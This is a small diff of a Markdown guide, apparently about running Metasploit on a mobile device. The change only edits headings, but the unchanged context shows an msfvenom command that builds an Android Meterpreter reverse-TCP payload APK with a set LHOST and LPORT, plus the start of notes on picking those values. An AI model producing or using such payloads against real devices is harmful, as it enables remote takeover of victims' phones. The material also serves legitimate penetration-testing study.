@@ -39,12 +39,12 @@ And run `msfconsole`
 ```bash
 msfconsole
 ```
-## cmd to generate `payload`
+## cmd to generate payload
 ```
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.29.29 LPORT=6767 R > /sdcard/payload.apk
 ```
 
-## What will be my `LHOST & LPORT`?
+## What will be my LHOST & LPORT?
 ```
 LHOST: your local ip of wifi/mobile network
 
